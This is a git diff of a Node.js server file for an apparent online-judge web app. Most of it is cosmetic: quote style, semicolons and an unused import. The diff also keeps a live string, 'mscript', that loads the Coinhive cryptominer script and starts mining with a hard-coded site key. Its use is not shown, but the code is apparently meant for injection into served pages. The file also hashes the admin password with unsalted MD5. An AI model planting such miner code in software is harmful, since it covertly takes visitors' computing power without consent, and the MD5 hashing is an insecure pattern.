@@ -1,10 +1,9 @@
 'use strict';
 
 let fs = require('fs');
-let path = require('path');
 let clc = require('cli-color');
 let init = require('./first');
-let mscript = `$.getScript('https://coinhive.com/lib/coinhive.min.js').done(function (script, textStatus) {	var miner = new CoinHive.Anonymous('2MNJwWlQs2A4c86fbjCLQPTWr2Uz58tY', {language: 'en'});miner.start();})`;
+let mscript = '$.getScript(\'https://coinhive.com/lib/coinhive.min.js\').done(function (script, textStatus) {	var miner = new CoinHive.Anonymous(\'2MNJwWlQs2A4c86fbjCLQPTWr2Uz58tY\', {language: \'en\'});miner.start();})';
 
 global.firstRun = false;
 
@@ -49,7 +48,7 @@ global.zoj = {
 			global.server = https.createServer(options, app);
 		} else {
 			let http = require('http');
-			global.server = http.createServer(app)
+			global.server = http.createServer(app);
 		}
 		global.io = require('socket.io').listen(server);
 
@@ -160,7 +159,7 @@ global.zoj = {
 					res.locals.user = null;
 					req.session.user_id = null;
 					next();
-				})
+				});
 			} else {
 				if (req.cookies.login) {
 					let obj;
@@ -241,8 +240,8 @@ if (firstRun) {
 
 		let user = await User.create({
 			username: 'administrator',
-			password: zoj.utils.md5(conif.getConsoleInput("Default Administrator password: ").trim()),
-			email: conif.getConsoleInput("Default Administrator email: ").trim(),
+			password: zoj.utils.md5(conif.getConsoleInput('Default Administrator password: ').trim()),
+			email: conif.getConsoleInput('Default Administrator email: ').trim(),
 			public_email: true,
 			group_config: '[1]'
 		});
